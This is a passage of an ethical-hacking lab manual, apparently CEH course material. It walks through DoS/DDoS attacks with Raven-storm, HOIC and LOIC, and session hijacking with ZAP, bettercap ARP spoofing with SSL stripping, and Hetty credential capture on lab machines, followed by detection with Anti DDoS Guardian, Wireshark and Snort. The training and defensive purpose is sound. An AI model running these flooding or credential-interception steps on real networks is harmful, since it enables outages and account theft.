Now click Windows Server 2019 to switch to Windows Server 2019 machine.

In the Type here to search field on the Desktop, type wireshark in the search field, the Wireshark appears in the results, click Wireshark to launch it.

Screenshot

The Wireshark Network Analyzer window appears. Double-click on the primary network interface (here, Ethernet 2) to start capturing the network traffic.

The network interface might differ when you perform the task.

Screenshot

Wireshark starts capturing the packets; leave it running.

Screenshot

Click Parrot Security to switch to Parrot Security window.

In the terminal window, type ip 10.10.1.19 and press Enter to specify the target IP address.

Screenshot

Type port 80 and press Enter, to specify the target port.

Screenshot

Type threads 20000 and press Enter, to specify number of threads.

Screenshot

Now, in the terminal type run and press Enter, to start the DoS attack on the target machine.

Screenshot

In the Do you agree to the terms of use? (Y/N) field, type Y and press Enter.

Screenshot

Raven-storm starts DoS attack on the target machine (here, Windows Server 2019).

Screenshot

Click Windows Server 2019 to switch to Windows Server 2019.

You can observe a large number of packets received from Parrot Security machine (10.10.1.13).

Screenshot

Click Parrot Security to switch to Parrot Security machine and press ctrl+z to stop the attack.

Screenshot

This concludes the demonstration of a DoS attack using Raven-storm.

Close all open windows and document all the acquired information.

========
Task 4: Perform a DDoS Attack using HOIC
========

HOIC (High Orbit Ion Cannon) is a network stress and DoS/DDoS attack application. This tool is written in the BASIC language. It is designed to attack up to 256 target URLs simultaneously. It sends HTTP, POST, and GET requests to a computer that uses lulz inspired GUIs. It offers a high-speed multi-threaded HTTP Flood; a built-in scripting system allows the deployment of “boosters,” which are scripts designed to thwart DDoS countermeasures and increase DoS output.

Here, we will use the HOIC tool to perform a DDoS attack on the target machine.

In this task, we will use the Windows 11, Windows Server 2019 and Windows Server 2022 machines to launch a DDoS attack on the Parrot Security machine.

Click Parrot Security switch to the Parrot Security machine. Click Applications in the top-left corner of Desktop and navigate to Pentesting --> Information Gathering --> wireshark.

Screenshot

A security pop-up appears, enter the password as toor in the Password field and click OK.

Screenshot

The Wireshark Network Analyzer window appears; double-click on the primary network interface (here, eth0) to start capturing the network traffic.

Screenshot

Click Windows 11 to switch to the Windows 11 machine.

Navigate to E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools and copy the High Orbit Ion Cannon (HOIC) folder to Desktop.

To perform the DDoS attack, run this tool from various machines at once. If you run the tool directly from the shared drive in the machines one at a time, errors might occur. To avoid errors, copy the folder High Orbit Ion Cannon (HOIC) individually to each machine’s Desktop, and then run the tool.

Screenshot

Similarly, follow the previous step (Step #5) on the Windows Server 2019 (click Windows Server 2019 to switch to the Windows Server 2019) and Windows Server 2022 (click Windows Server 2022 to switch to the Windows Server 2022) machines.

In Windows Server 2019, click Ctrl+Alt+Delete to activate the machine, by default, Administrator profile is selected, click Pa$$w0rd to enter the password and press Enter to log in.

In Windows Server 2022, click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator profile is selected, click Pa$$w0rd to enter the password and press Enter to log in.

On the Windows Server 2019 and Windows Server 2022 machines, the High Orbit Ion Cannon (HOIC) folder is located at Z:\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools.

Screenshot

Now, click Windows 11 to switch to the Window 11 machine and navigate to Desktop. Open the High Orbit Ion Cannon (HOIC) folder and double-click hoic2.1.exe.

If an Open File - Security Warning pop-up appears, click Run.

Screenshot

The HOIC GUI main window appears; click the “+” button below the TARGETS section.

Screenshot

The HOIC - [Target] pop-up appears. Type the target URL such as http://[Target IP Address] (here, the target IP address is 10.10.1.13 [Parrot Security]) in the URL field. Slide the Power bar to High. Under the Booster section, select GenericBoost.hoic from the drop-down list, and click Add.

Screenshot

Set the THREADS value to 20 by clicking the > button until the value is reached.

Screenshot

Now, switch to the Windows Server 2019 (click Windows Server 2019 to switch to the Windows Server 2019) and Windows Server 2022 (click Windows Server 2022 to switch to the Windows Server 2022) machines and follow Steps 7-10 to configure HOIC.

Once HOIC is configured on all machines, switch to each machine (Windows 11, Windows Server 2019, and Windows Server 2022) and click the FIRE TEH LAZER! button to initiate the DDoS attack on the target the Parrot Security machine.

To switch to the Windows 11, click Windows 11.

To switch to the Windows Server 2019, click Windows Server 2019.

To switch to the Windows Server 2022, click Windows Server 2022.

Screenshot

Observe that the Status changes from READY to ENGAGING, as shown in the screenshot.

Screenshot

Click Parrot Security switch to the Parrot Security machine.

Observe that Wireshark starts capturing a large volume of packets, which means that the machine is experiencing a huge number of incoming packets. These packets are coming from the Windows 11, Windows Server 2019, and Windows Server 2022 machines.

Screenshot

You can observe that the performance of the machine is slightly affected and that its response is slowing down.

In this lab, only three machines are used to demonstrate the flooding of a single machine. If there are a large number of machines performing flooding, then the target machine’s (here, Parrot Security) resources are completely consumed, and the machine is overwhelmed.

In real-time, a group of hackers operating hundreds or thousands of machines configure this tool on their machines, communicate with each other through IRCs, and simulate the DDoS attack by flooding a target machine or website at the same time. The target is overwhelmed and stops responding to user requests or starts dropping packets coming from legitimate users. The larger the number of attacker machines, the higher the impact of the attack on the target machine or website.

On completion of the task, click FIRE TEH LAZER! again, and then close the HOIC window on all the attacker machines. Also, close the Wireshark window on the Parrot Security machine.

To switch to the Windows 11, click Windows 11.

To switch to the Windows Server 2019, click Windows Server 2019.

To switch to the Windows Server 2022, click Windows Server 2022.

To switch to Parrot Security machine click Parrot Security.

Screenshot

This concludes the demonstration of how to perform a DDoS attack using HOIC.

Close all open windows and document all the acquired information.

========
Task 5: Perform a DDoS Attack using LOIC
========

Here, we will use the LOIC tool to perform a DDoS attack on the target system.

In this task, we will use the Windows 11, Windows Server 2019, and Windows Server 2022 machines to launch a DDoS attack on the Parrot Security machine.

Click Windows 11 to switch to the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\Low Orbit Ion Cannon (LOIC) and double-click LOIC.exe.

If an Open File - Security Warning pop-up appears, click Run.

Screenshot

The Low Orbit Ion Cannon main window appears.

Perform the following settings:

Under the Select your target section, type the target IP address under the IP field (here, 10.10.1.13), and then click the Lock on button to add the target devices.

Under the Attack options section, select UDP from the drop-down list in Method. Set the thread's value to 10 under the Threads field. Slide the power bar to the middle.

msql1avx.jpg

Now, switch to the Windows Server 2019 and Windows Server 2022 machines and follow Steps 1 - 3 to launch LOIC and configure it.

To switch to the Windows Server 2019, click Windows Server 2019.

To switch to the Windows Server 2022, click Windows Server 2022.

On the Windows Server 2019 and Windows Server 2022 machines, LOIC is located at Z:\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\Low Orbit Ion Cannon (LOIC).

Once LOIC is configured on all machines, switch to each machine (Windows 11, Windows Server 2019, and Windows Server 2022) and click the IMMA CHARGIN MAH LAZER button under the Ready? section to initiate the DDoS attack on the target Parrot Security machine.

To switch to the Windows 11, click Windows 11.

To switch to the Windows Server 2019, click Windows Server 2019.

To switch to the Windows Server 2022, click Windows Server 2022.

iixleilo.jpg

Click Parrot Security to switch to the Parrot Security machine.

Click Applications in the top-left corner of Desktop and navigate to Pentesting --> Information Gathering --> wireshark.

Screenshot

A security pop-up appears, enter the password as toor in the Password field and click OK.

Screenshot

The Wireshark Network Analyzer window appears. Double-click on the primary network interface (here, eth0) to start capturing the network traffic.

Screenshot

Observe that Wireshark starts capturing a large volume of packets, which means that the machine is experiencing a huge number of incoming packets. These packets are coming from the Windows 11, Windows Server 2019, and Windows Server 2022 machines.

Screenshot

Leave the machine intact for 5–10 minutes, and then open it again. You will observe that the performance of the machine is slightly affected and that its response is slowing down.

On completion of the task, click Stop flooding, and then close the LOIC window on all the attacker machines.

To switch to the Windows 11, click Windows 11.

To switch to the Windows Server 2019, click Windows Server 2019.

To switch to the Windows Server 2022, click Windows Server 2022.

fucqjr4o.jpg

This concludes the demonstration of how to perform a DDoS attack using LOIC.

Close all open windows and document all the acquired information.

########
Lab 2: Detect and Protect Against DoS and DDoS Attacks
########

========
Task 1: Detect and Protect Against DDoS Attacks using Anti DDoS Guardian
========

Here, we will detect and protect against a DDoS attack using Anti DDoS Guardian.

In this task, we will use the Windows Server 2019 and Windows Server 2022 machines to perform a DDoS attack on the target system, Windows 11.

On the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Protection Tools\Anti DDoS Guardian and double click Anti_DDoS_Guardian_setup.exe.

If a User Account Control pop-up appears, click Yes.

If an Open File - Security Warning pop-up appears, click Run.

Screenshot

The Setup - Anti DDoS Guardian window appears; click Next. Follow the wizard-driven installation steps to install the application.

Screenshot

In the Stop Windows Remote Desktop Brute Force wizard, uncheck the install Stop RDP Brute Force option, and click Next.

3waqg51e.jpg

The Select Additional Tasks wizard appears; check the Create a desktop shortcut option, and click Next.

Screenshot

The Ready to Install wizard appears; click Install.

Screenshot

The Completing the Anti DDoS Guardian Setup Wizard window appears; uncheck the Launch Mini IP Blocker option and click Finish.

Screenshot

The Anti-DDoS Wizard window appears; click Continue in all the wizard steps, leaving all the default settings. In the last window, click Finish.

Click Show hidden icons from the bottom-right corner of Desktop and click the Anti DDoS Guardian icon.

13f54wcmr.jpg

Screenshot

The Anti DDoS Guardian window appears, displaying information about incoming and outgoing traffic, as shown in the screenshot.

Screenshot

Now, click Windows Server 2019 to switch to the Windows Server 2019 and click Ctrl+Alt+Delete to activate the machine. By default, Administrator profile is selected, click Pa$$w0rd to enter the password and press Enter to log in.

Screenshot

Navigate to Z:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\Low Orbit Ion Cannon (LOIC) and double-click LOIC.exe.

If an Open File - Security Warning pop-up appears, click Run.

Screenshot

The Low Orbit Ion Cannon main window appears.

Perform the following settings:

Under the Select your target section, type the target IP address under the IP field (here, 10.10.1.11), and then click the Lock on button to add the target devices.

Under the Attack options section, select UDP from the drop-down list in Method. Set the thread's value to 5 under the Threads field. Slide the power bar to the middle.

1l3xiopr.jpg

Now, switch to the Windows Server 2022 machine and follow Steps 11 - 13 to launch LOIC and configure it.

To switch to the Windows Server 2022, click Windows Server 2022.

Once LOIC is configured on all machines, switch to each machine (Windows Server 2019, and Windows Server 2022) and click the IMMA CHARGIN MAH LAZER button under the Ready? section to initiate the DDoS attack on the target Windows 11 machine.

Screenshot

Click Windows 11 to switch back to the Windows 11 machine and observe the packets captured by Anti DDoS Guardian.

Observe the huge number of packets coming from the host machines (10.10.1.19 [Windows Server 2019] and 10.10.1.22 [Windows Server 2022]).

Screenshot

Double-click any of the sessions 10.10.1.19 or 10.10.1.22.

Here, we have selected 10.10.1.22. You can select either of them.

The Anti DDoS Guardian Traffic Detail Viewer window appears, displaying the content of the selected session in the form of raw data. You can observe the high number of incoming bytes from Remote IP address 10.10.1.22, as shown in the screenshot.

You can use various options from the left-hand pane such as Clear, Stop Listing, Block IP, and Allow IP. Using the Block IP option blocks the IP address sending the huge number of packets.

In the Traffic Detail Viewer window, click Block IP option from the left pane.

ti4qmixh.jpg

Observe that the blocked IP session turns red in the Action Taken column.

Screenshot

Similarly, you can Block IP the address of the 10.10.1.19 session.

On completion of the task, click Stop flooding, and then close the LOIC window on all the attacker machines. (Windows Server 2019 and Windows Server 2022).

To switch to the Windows Server 2019, click Windows Server 2019.

To switch to the Windows Server 2022, click Windows Server 2022.

Screenshot

This concludes the demonstration of how to detect and protect against a DDoS attack using Anti DDoS Guardian.

Close all open windows and document all the acquired information.

You can also use other DoS and DDoS protection tools such as, DOSarrest’s DDoS protection service (https://www.dosarrest.com), DDoS-GUARD (https://ddos-guard.net), and Cloudflare (https://www.cloudflare.com) to protect organization’s systems and networks from DoS and DDoS attacks.

Click Windows 11 to switch to the Windows 11 virtual machine. In Windows 11 machine, navigate to Control Panel --> Programs --> Programs and Features and uninstall Anti DDoS Guardian.


########
Module 11 - Session Hijacking
########

########
Lab 1
########

========
Task 1: Hijack a Session using Zed Attack Proxy (ZAP)
========

Here, we will hijack a session using ZAP. You will learn how to intercept the traffic of victims’ machines with a proxy and how to view all the requests and responses from them.

Before starting this task, we need to configure the proxy settings in the victim’s machine, which in this task will be the Windows 11 machine.

By default, Windows 11 machine selected, click Ctrl+Alt+Delete.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows 11 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

Screenshot

By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

If Welcome to Windows wizard appears, click Continue. In the Sign in with Microsoft wizard click Cancel to continue.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Open any web browser (here, Google Chrome), click the Customize and control Google Chrome icon, and select Settings from the context menu.

Screenshot

On the Settings page, scroll down, expand the Advanced settings and select System option from the left pane.

Screenshot

System page appears and click Open your computer’s proxy settings to configure a proxy.

Screenshot

A Settings window opens, with the Proxy settings in the right pane.

Click Set up button under Manual proxy setup section.

Screenshot

Edit proxy server window appears, make the following changes:

Under the Use a proxy server option, click the Off button to switch it On.
In the Proxy IP address field, type 10.10.1.19 (the IP address of the attacker’s machine).
In the Port field, type 8080.
Click Save.
2022-04-13_11-32-00.png

After saving, close the Settings and browser windows. You have now configured the proxy settings of the victim’s machine.

Click Windows Server 2019 to switch to the Windows Server 2019 machine. Click Ctrl+Alt+Delete to activate the machine, by default, Administrator account is selected, click Pa$$w0rd to enter the password and press Enter

Screenshot

Click Type here to search icon ( 2022-04-13_11-39-59.png) on the Desktop. Type zap in the search field, the ZAP 2.11.1 appears in the result, press Enter to launch it.

Screenshot

OWASP ZAP initializes and a prompt that reads Do you want to persist the ZAP Session? appears. Select the No, I do not want to persist this session at this moment in time radio button and click Start.

Screenshot

The OWASP ZAP main window appears. Click on the “+” icon in the right pane and select Break from the options.

If a OWASP ZAP pop-up appears, click OK in all the pop-ups.

The Break tab allows you to modify a response or request when ZAP has caught it. It also allows you to modify certain elements that you cannot modify through your browser, including:

The header
Hidden fields
Disabled fields
Fields that use JavaScript to filter out illegal characters
Screenshot

The Break tab is added to your OWASP ZAP window.

To configure ZAP as a proxy, click the Options… icon from the toolbar.

2022-04-13_11-45-52.png

In the Options window, scroll-down in the left-pane and click Local Proxies. In the right pane, under the Local Proxy section, type 10.10.1.19 (the IP address of the Windows Server 2019 machine) in the Address field and leave the Port value to the default, 8080; click OK.

2022-04-13_11-48-26.png

Click the Set break on all requests and responses icon on the main ZAP toolbar. This button sets and unsets a global breakpoint that will trap and display the next response or request from the victim’s machine in the Break tab.

The Set break on all requests and responses icon turns automatically from green to red.

2022-04-13_11-49-52.png

Now, click Windows 11 to switch back to the victim’s machine (Windows 11) and launch the same browser in which you configured the proxy settings. In this task, we have configured the Google Chrome browser.

Place your mouse cursor in the address bar, type www.moviescope.com and press Enter.

A message appears, stating that Your connection is not private. Click the Advanced button.

On the next page, click Proceed to www.moviescope.com (unsafe) to open the website.

Screenshot

Now, click Windows Server 2019 to switch back to the attacker machine (Windows Server 2019) and observe that OWASP ZAP has begun to capture the requests of the victim’s machine.

In Steps 19-21, we have visited www.moviescope.com in the victim’s browser. Look in the Break tab and click the Submit and step to next request or response icon on the toolbar to capture the www.moviescope.com request.

2022-04-13_11-54-40.png

A HTTP response appears; click the Submit and step to next request or response icon again on the toolbar.

Screenshot

Now, in the Break tab, modify www.moviescope.com to www.goodshopping.com in all the captured GET requests.

If you find any URL starting with https, modify it to http.

Once you have modified the GET requests, click the Submit and step to next request or response icon on the toolbar to forward the traffic to the victim’s machine.

2022-04-13_11-56-39.png

In all the HTTP Not Found requests, click the Submit and step to next request or response icon on the toolbar to forward the traffic.

2022-04-13_11-58-22.png

In a similar way, modify every GET request captured by OWASP ZAP until you see the www.goodshopping.com page in the victim’s machine.

You will need to switch back and forth from the victim’s machine to see the browser status while you do this.

If you do not receive any request or you see a blank break tab then switch to Windows 11 machine and refresh the browser to capture the request again.

Now, click on Windows 11 to switch to the victim’s machine (Windows 11); the browser displays the website that the attacker wants the victim’s machine to see (in this example, www.goodshopping.com).

It takes multiple iterations to open the Good Shopping site in the victim’s machine.

The victim has navigated to www.moviescope.com, but now sees www.goodshopping.com; while the address bar displays www. moviescope.com, the window displays www.goodshopping.com.

2022-04-13_12-05-13.png

Now, we shall change the proxy settings back to the default settings. To do so, perform Steps 3-5 again.

In the Settings window, under the Manual proxy setup section in the right-pane, click the Edit button.

Screenshot

Edit proxy server window appears, under the Use a proxy server option, click the On button to switch it Off and click Save.

Screenshot

This concludes the demonstration of performing session hijacking using ZAP.

Close all open windows and document all the acquired information.

========
Task 2: Intercept HTTP Traffic using bettercap
========

ParrotOS

In the terminal window; type bettercap -h and press Enter.

In this command, -h: requests a list of the available options.

Screenshot

In the terminal window, type bettercap -iface eth0 and press Enter to set the network interface.

-iface: specifies the interface to bind to (in this example, eth0).

Type help and press Enter to view the list of available modules in bettercap.

Screenshot

Type net.probe on and press Enter. This module will send different types of probe packets to each IP in the current subnet for the net.recon module to detect them.

Type net.recon on and press Enter. This module is responsible for periodically reading the system ARP table to detect new hosts on the network.

The net.recon module displays the detected active IP addresses in the network. In real-time, this module will start sniffing network packets.

Type set http.proxy.sslstrip true and press Enter. This module enables SSL stripping.

Screenshot

Type set arp.spoof.internal true and press Enter. This module spoofs the local connections among computers of the internal network.

Type set arp.spoof.targets 10.10.1.11 and press Enter. This module spoofs the IP address of the target host.

Type http.proxy on and press Enter. This module initiates http proxy.

Screenshot

Type arp.spoof on and press Enter. This module initiates ARP spoofing.

Type net.sniff on and press Enter. This module is responsible for performing sniffing on the network.

Screenshot

Type set net.sniff.regexp ‘.*password=.+’ and press Enter. This module will only consider the packets sent with a payload matching the given regular expression (in this case, ‘.*password=.+’).

Screenshot

You can observe that bettercap starts sniffing network traffic on target machine Windows 11.

Now, click Windows 11 to switch to the Windows 11 machine. Open any web browser (in this case, Mozilla Firefox). In the address bar place your mouse cursor, type http://www.moviescope.com and press Enter.

Screenshot

Click Parrot Security to switch back to the Parrot Security machine. You can observe that bettercap has sniffed the website browsed by the victim on the target system, as shown in the screenshot.

2022-04-13_12-34-46.png

Click Windows 11 to switch to the Windows 11 machine. On the MovieScope website, enter any credentials (here, sam/test) and press Enter to log in.

Screenshot

Click Parrot Security to switch to the Parrot Security machine. You can observe the details of both the browsed website and the credentials obtained in plain text, as shown in the screenshot.

bettercap collects all http logins used by routers, servers, and websites that do not have SSL enabled. In this task, we are using www.moviescope.com for demonstration purposes, as it is http-based. To use bettercap to sniff network traffic from https-based websites, you must enable the SSL strip module by issuing the command set http.proxy.sslstrip true.

2022-04-13_12-39-34.png

After obtaining the credentials, press Ctrl+C to terminate bettercap. The credentials can be used to log in to the target user’s account and obtain further sensitive information.

When the Are you sure you want to quit this session? message appears, press y, and then Enter.

Screenshot

This concludes the demonstration of how to intercept HTTP traffic using bettercap.

Close all open windows and document all the acquired information.

========
Task 3: Intercept HTTP Traffic using Hetty
========

Here, we will use the Hetty tool to intercept HTTP traffic on the target system.

Here, we will use Windows 11 machine as an attacker machine and Windows Server 2022 machine as a target machine.

Click Windows 11 to switch to the Windows 11 machine.

Navigate to E:\CEH-Tools\CEHv12 Module 11 Session Hijacking\Hetty and double-click hetty.exe.

Screenshot

Open File - Security Warning window appears, click Run.

A Command Prompt window appears, and Hetty initializes.

Screenshot

Now, minimize all the windows and launch any web browser (here, Mozilla Firefox).

A browser window, in the address bar, type http://localhost:8080 and press Enter to open Hetty dashboard.

Screenshot

In the Hetty dashboard, click MANAGE PROJECTS button.

Screenshot

Projects page appears, type Project name as Moviescope under New Project section and click + CREATE & OPEN PROJECT button.

Screenshot

You can observe that a new project name Moviescope has been created under Manage projects section with a status as Active.

Screenshot

Click Proxy logs icon ( 2022-04-13_15-20-45.png)) from the left-pane.

Screenshot

A Proxy logs page appears, as shown in the screenshot.

Screenshot

Now, click Windows Server 2022 to switch to the Windows Server 2022 machine. Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, click Pa$$w0rd to enter the password and press Enter.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Open Google Chrome web browser, click the Customize and control Google Chrome icon, and select Settings from the context menu.

Screenshot

On the Settings page, expand Advanced settings and click System in the left-pane.

Screenshot

Scroll down to the System section and click Open your computer’s proxy settings to configure a proxy.

Screenshot

A Settings window appears, with the Proxy settings in the right pane.

In the Manual proxy setup section, make the following changes:

Under the Use a proxy server option, click the Off button to switch it On.
In the Address field, type 10.10.1.11 (the IP address of the attacker’s machine, here, Windows 11).
In the Port field, type 8080.
Click Save.
Screenshot

After saving, close the Settings and browser windows. You have now configured the proxy settings of the victim’s machine.

Now, in the browser window open a new tab, in the address bar, type http://www.moviescope.com and press Enter.

Screenshot

Click Windows 11 to switch to the Windows 11 machine.

You can observe that the logs are captured in the Proxy logs page. Here, we are focusing on logs associated with moviescope.com website.

2022-04-13_15-18-54.png

Click Windows Server 2022 to switch back to the Windows Server 2022 machine.

In the MovieScope website, login as a victim with credentials as sam/test.

Screenshot

Now, click Windows 11 to switch to the Windows 11 machine.

In the Proxy logs page, scroll-down to check more logs on moviescope website. Check for POST log captured for the target website.

Screenshot

Select the POST request and in the lower section of the page, select Body tab under POST section.

Under the Body tab, you can observe the captured user credentials, as shown in the screenshot.

2022-04-13_15-32-02.png

The captured credentials can be used to log in to the target user’s account and obtain further sensitive information.

Now, we shall change the proxy settings back to the default settings. To do so, click Windows Server 2022 to switch back to the Windows Server 2022 machine and perform Steps 13-16 again.

If you are logged out of the Windows Server 2022 machine, click Ctrl+Alt+Delete, then login into CEH\Administrator user profile using Pa$$w0rd as password.

In the Settings window, under the Manual proxy setup section in the right pane, click the On button to toggle it back to Off, as shown in the screenshot.

Screenshot

This concludes the demonstration of HTTP traffic interception using Hetty.

Close all open windows and document all the acquired information.

########
Lab 2 - Detect Session Hijacking
########

========
Task 1: Detect Session Hijacking using Wireshark
========


Wireshark allows you to capture and interactively browse the traffic running on a network. The tool uses WinPcap to capture packets, and so is only able to capture packets on networks that are supported by WinPcap. It captures live network traffic from Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI networks. Security professionals can use Wireshark to monitor and detect session hijacking attempts.

Here, we will use the Wireshark tool to detect session hijacking attacks manually on the target system.

We will use the Parrot Security (10.10.1.13) machine to carry out a session hijacking attack on the Windows 11 (10.10.1.11) machine.

Click Windows 11 to switch to the Windows 11 machine.

Click Search icon ( 2022-04-14_10-19-23.png) on the Desktop. Type wire in the search field, the Wireshark appears in the result, click Open to launch it.

Screenshot

The Wireshark Network Analyzer window opens. Double-click the primary network interface (in this case, Ethernet) to start capturing network traffic.

Screenshot

Wireshark starts capturing network traffic. Leave it running.

Now, we shall launch a session hijacking attack on the target machine (Windows 11) using bettercap.

To do so, you may either follow Steps 8-15 below, or refer to Task 2 (Intercept HTTP Traffic using bettercap) in Lab 1.

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the terminal window, type bettercap -iface eth0 and press Enter to set the network interface.

-iface: specifies the interface to bind to (here, eth0).

Screenshot

Type net.probe on and press Enter. This module will send different types of probe packets to each IP in the current subnet for the net.recon module to detect them.

Type net.recon on and press Enter. This module is responsible for periodically reading the system ARP table to detect new hosts on the network.

The net.recon module displays the detected active IP addresses in the network. In real-time, this module will start sniffing network packets.

Type net.sniff on and press Enter. This module is responsible for performing sniffing on the network.

You can observe that bettercap starts sniffing network traffic on different machines in the network, as shown in the screenshot.

Screenshot

Click Windows 11 to switch back to the Windows 11 machine and observe the huge number of ARP packets captured by the Wireshark, as shown in the screenshot.

bettercap sends several ARP broadcast requests to the hosts (or potentially active hosts). A high number of ARP requests indicates that the system at 10.10.1.13 (the attacker’s system in this task) is acting as a client for all the IP addresses in the subnet, which means that all the packets from the victim node (in this case, 10.10.1.11) will first go to the host system (10.10.1.13), and then the gateway. Similarly, any packet destined for the victim node is first forwarded from the gateway to the host system, and then from the host system to the victim node.

...less
Screenshot

This concludes the demonstration of how to detect a session hijacking attack using Wireshark.

Close all open windows and document all the acquired information.

########
Module 12 - Evading IDS, Firewalls, and Honeypots
########

########
Lab 1 - Performing intrusion detection using various tools
########

========
Task 1: Detect Intrusions using Snort
========

To become an expert penetration tester and security administrator, you must possess sound knowledge of network IPSs, IDSs, malicious network activity, and log information.

Lab Objectives

Detect intrusions using Snort
Detect malicious network traffic using ZoneAlarm FREE FIREWALL
Detect malicious network traffic using HoneyBOT
Overview of Intrusion Detection Systems

Intrusion detection systems are highly useful as they monitor both the inbound and outbound traffic of the network and continuously inspects the data for suspicious activities that may indicate a network or system security breach. The IDS checks traffic for signatures that match known intrusion patterns and signals an alarm when a match is detected. It can be categorized into active and passive, depending on its functionality: an IDS is generally passive and is used to detect intrusions, while an intrusion prevention system (IPS) is considered as an active IDS, as it is not only used to detect the intrusion on the network, but also prevent them.

Main Functions of IDS:

Gathers and analyzes information from within a computer or a network, to identify the possible violations of security policy
Also referred to as a “packet-sniffer,” which intercepts packets traveling along various communication mediums and protocols
Evaluates traffic for suspected intrusions and signals an alarm after detection
Task 1: Detect Intrusions using Snort
Snort is an open-source network intrusion detection system, capable of performing real-time traffic analysis and packet logging on IP networks. It can perform protocol analysis and content searching/matching and is used to detect a variety of attacks and probes such as buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. It uses a flexible rules language to describe traffic to collect or pass, as well as a detection engine that utilizes a modular plug-in architecture.

Uses of Snort:

Straight packet sniffer such as tcpdump
Packet logger (useful for network traffic debugging, etc.)
Network intrusion prevention system
Here, we will use Snort to detect network intrusions.

Click on Windows Server 2019 to switch to Windows Server 2019 machine. Click Ctrl+Alt+Delete to activate the machine. By default, Administrator user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows Server 2019 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Navigate to Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort and double-click the Snort_2_9_15_Installer.exe file to start the Snort installation.

If an Open File - Security warning pop-up window appears, click Run.

Screenshot

Accept the License Agreement and install Snort by selecting the default options that appear step by step in the wizard.

Screenshot

A window appears after the successful installation of Snort; click Close.

Click OK to exit the Snort Installation window.

Snort requires WinPcap to be installed on your machine. In this task environment, we have already installed WinPcap drivers for packet capturing.

Screenshot

By default, Snort installs itself in C:\Snort (C:\ or D:\, depending on the disk drive in which the OS is installed).

Screenshot

Navigate to the etc folder in the specified location, Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150\etc of the Snort rules; copy snort.conf and paste it in C:\Snort\etc.

snort.conf is already present in C:\Snort\etc; replace the file with the newly copied file.

Screenshot

Copy the so_rules folder from Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150 and paste into C:\Snort.

Screenshot

Copy the preproc_rules folder from Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150, and paste it into C:\Snort. The preproc_rules folder is already present in C:\Snort; replace this folder with the preproc_rules folder taken from the specified location.

Screenshot

Using the same method, copy the rules folder from Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150 and paste into C:\Snort.

Screenshot

Now right-click on the Windows Start icon and click Run from the menu.

Screenshot

The Run window appears; type cmd in the Open field and click OK to launch command prompt window.

Screenshot

The Command Prompt window appears; type cd C:\Snort\bin and press Enter to access the bin folder in the command prompt.

Screenshot

Type snort and press Enter.

Screenshot

Snort initializes; wait for it to complete. After completion press Ctrl+C, Snort exits and comes back to C:\Snort\bin.

Screenshot

Now type snort -W. This command lists your machine’s physical address, IP address, and Ethernet Drivers, but all are disabled by default.

Screenshot

Observe your Ethernet Driver index number and write it down (in this task, it is 1).

To enable the Ethernet Driver, in the command prompt, type snort -dev -i 1 and press Enter.

You see a rapid scroll text in the command prompt, which means that the Ethernet Driver is enabled and working properly.

Screenshot

Leave the Snort command prompt window open, and launch another command prompt window.

In a new command prompt, type ping google.com and press Enter.

Screenshot

This ping command triggers a Snort alert in the Snort command prompt with rapid scrolling text.

The Google IP address will differ when you perform this task.

Screenshot

Close both command prompt windows. The verification of Snort installation and the triggering alert is complete, and Snort is working correctly in verbose mode.

Configure the snort.conf file, located at C:\Snort\etc.

Open the snort.conf file with Notepad++.

Screenshot

Scroll down to the Step #1: Set the network variables section (Line 41) of the snort.conf file. In the HOME_NET line (Line 45), replace any with the IP addresses of the machine (target machine) on which Snort is running. Here, the target machine is Windows Server 2019 and the IP address is 10.10.1.19.

This IP address may vary when you perform this task.

Leave the EXTERNAL_NET any line as it is.

If you have a DNS Server, then make changes in the DNS_SERVERS line by replacing $HOME_NET with your DNS Server IP address; otherwise, leave this line as it is.

Here, the DNS server is 8.8.8.8.

vvvwvrhy.jpg

The same applies to SMTP_SERVERS, HTTP_SERVERS, SQL_SERVERS, TELNET_SERVERS, and SSH_SERVERS.

Remember that if you do not have any servers running on your machine, leave the line as it is. DO NOT make any changes in that line.

